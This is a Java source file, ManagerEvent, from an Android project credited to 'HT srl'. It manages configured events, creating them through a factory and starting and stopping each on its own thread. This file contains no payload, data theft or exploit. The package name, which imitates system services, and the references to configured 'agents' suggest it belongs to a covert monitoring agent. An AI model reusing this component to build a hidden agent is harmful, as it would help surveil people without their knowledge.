/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.manager;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.conf.ConfigurationException;
import com.android.service.event.BaseEvent;
import com.android.service.event.FactoryEvent;
import com.android.service.util.Check;

/**
 * The Class EventManager.
 */
public class ManagerEvent extends Manager<BaseEvent, Integer, String> {
	/** The Constant TAG. */
	private static final String TAG = "EventManager"; //$NON-NLS-1$

	/** The singleton. */
	private volatile static ManagerEvent singleton;

	/**
	 * Self.
	 * 
	 * @return the event manager
	 */
	public static ManagerEvent self() {
		if (singleton == null) {
			synchronized (ManagerEvent.class) {
				if (singleton == null) {
					singleton = new ManagerEvent();
					singleton.setFactory(new FactoryEvent());
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private BaseEvent createEvent(final String type, final ConfEvent conf) {

		BaseEvent event=null;
		
		String subtype=conf.getSafeString("subtype");
		if(subtype==null) subtype="";
		
		String ts=conf.getSafeString("ts");
		String te=conf.getSafeString("te");
		
		// TODO
		if(subtype==null && "00:00:00".equals(ts) && "23:59:59".equals(te)){
			subtype="loop";
		}
		
		if (instances.containsKey(conf.getId()) == true) {
			event = instances.get(conf.getId());
			if(!subtype.equals(event.getSubType())){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (createEvent): same id, but different subtype");
				}
				event=null;
			}
		}
		
		if(event==null){
			event = factory.create(type, subtype);
		}

		if (event != null) {
			instances.put(conf.getId(), event);
		}

		return event;
	}

	/**
	 * Start events.
	 * 
	 * @return true, if successful
	 */
	@Override
	public synchronized boolean startAll() {
		HashMap<Integer, ConfEvent> events = status.getEventsMap();

		if (events == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Events map null") ;//$NON-NLS-1$
			}
			return false;
		}

		if (instances == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Events map null") ;//$NON-NLS-1$
			}
			return false;
		}

		final Iterator<Map.Entry<Integer, ConfEvent>> it = events.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, ConfEvent> pairs = it.next();

			int key=pairs.getKey();
			start(key);						
		}

		return true;
	}

	/**
	 * Stop events.
	 */
	@Override
	public synchronized void stopAll() {
		final Iterator<Map.Entry<Integer, BaseEvent>> it = instances.entrySet().iterator();

		if (Cfg.DEBUG) {
			Check.log( TAG + " (stopAll)") ;//$NON-NLS-1$
		}

		while (it.hasNext()) {
			final Map.Entry<Integer, BaseEvent> pairs = it.next();
			int key = pairs.getKey();
			stop(key);
		}

		if (Cfg.DEBUG) {
			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
		}
				
		instances.clear();
		threads.clear();
		
		if (Cfg.DEBUG) {
			Check.ensures(instances.size() == 0, "Non empty running"); //$NON-NLS-1$
		}
	}

	@Override
	public void start(Integer key) {
		HashMap<Integer, ConfEvent> events = status.getEventsMap();
		ConfEvent conf = events.get(key);
		final String type = conf.getType();

		final BaseEvent e = createEvent(type, conf);

		if (e != null) {	
			e.setConf(conf);

			if (!e.isRunning() && e.isEnabled()) {
				final Thread t = new Thread(e);
				
				if (Cfg.DEBUG) {
					t.setName(e.getClass().getSimpleName());
				}
				
				t.start();
				
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start): " + e) ;//$NON-NLS-1$
				}
				
				threads.put(e, t);
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Warn: event already running") ;//$NON-NLS-1$
				}
			}
		}
	}

	@Override
	public void stop(Integer key) {
		
		BaseEvent event=instances.get(key);

		try {
			
			if (event.isRunning()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): " + event) ;//$NON-NLS-1$
				}
				event.stopThread();
				
				try {
					final Thread t = threads.get(event);
					if (Cfg.DEBUG) {
						Check.asserts(t != null, "Null thread"); //$NON-NLS-1$
					}

					if (t != null) {
						t.join();
						threads.remove(event);
					} else {

					}

				} catch (final InterruptedException e) {
					if (Cfg.DEBUG) {
						Check.log(e) ;//$NON-NLS-1$
						Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
					}
				}
				
				//instances.remove(event);
			} else {
				if (Cfg.DEBUG) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stop) but not running: " + event);
					}
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopAll): " + ex) ;//$NON-NLS-1$
			}
		}
	}
}
